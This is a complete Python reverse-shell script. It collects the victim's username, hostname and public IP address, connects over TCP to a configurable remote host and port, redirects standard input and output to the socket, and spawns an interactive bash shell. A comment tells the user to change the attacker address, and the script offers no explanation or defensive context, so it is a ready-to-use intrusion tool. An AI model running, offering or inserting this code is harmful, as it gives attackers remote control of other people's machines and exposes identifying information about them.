#!/usr/bin/env python3

try:
    from subprocess import call, CalledProcessError
    from sys import exit
    from os import dup2
    from requests import get
    from socket import socket, AF_INET, SOCK_STREAM, gethostname, error
    from pwd import getpwuid
    from os import getuid
    from time import sleep
except ImportError:
    raise RuntimeError("Important modules are missing, quitting.")

GREEN = "\033[0;92m"
RED = "\033[0;31m"
RESET = "\033[0m"

class ShellPtr:
    def __init__(
            self, local_username: str, local_hostname: str,
            remote_ipv4_address: str, remote_port: int
    ):
        self.local_hostname = local_hostname
        self.local_username = local_username
        self.remote_ipv4_address = remote_ipv4_address
        self.remote_port = remote_port

    def build_shell(self):
        public_ipv4 = get("https://api.ipify.org").text
        target_details = (f"\n[ {GREEN}OK{RESET} ] successfully connected via TCP to:"
                          f"\n\n\t\tusername: {self.local_username}"
                          f"\n\t\thostname: {self.local_hostname}"
                          f"\n\t\tpublic ip: {public_ipv4}\n\n")
        info_message = f"\n[ ... ] starting reverse shell to {self.remote_ipv4_address}\n"

        try:
            with socket(AF_INET, SOCK_STREAM) as reverse_shell:
                reverse_shell.connect((self.remote_ipv4_address, self.remote_port))
                reverse_shell.send(info_message.encode())
                sleep(0.75)
                dup2(reverse_shell.fileno(), 0)
                dup2(reverse_shell.fileno(), 1)
                dup2(reverse_shell.fileno(), 2)
                reverse_shell.send(target_details.encode())
                call(["/bin/bash", "-i"])
        except ConnectionRefusedError as conn_err:
            exit(f"[ {RED}ERROR{RESET} ] {conn_err}")
        except error as sock_err:
            exit(f"[ {RED}ERROR{RESET} ] {sock_err}")


if __name__ == "__main__":
    try:
        call(["clear"])
        # change the ipv4 address here:
        remote_connection = ShellPtr(getpwuid(getuid())[0], gethostname(), "127.0.0.1", 5003)
        remote_connection.build_shell()
    except KeyboardInterrupt:
        exit("Ctrl+C pressed, Exit")
    except CalledProcessError as proc_err:
        exit(f"[ {RED}ERROR{RESET} ] {proc_err}")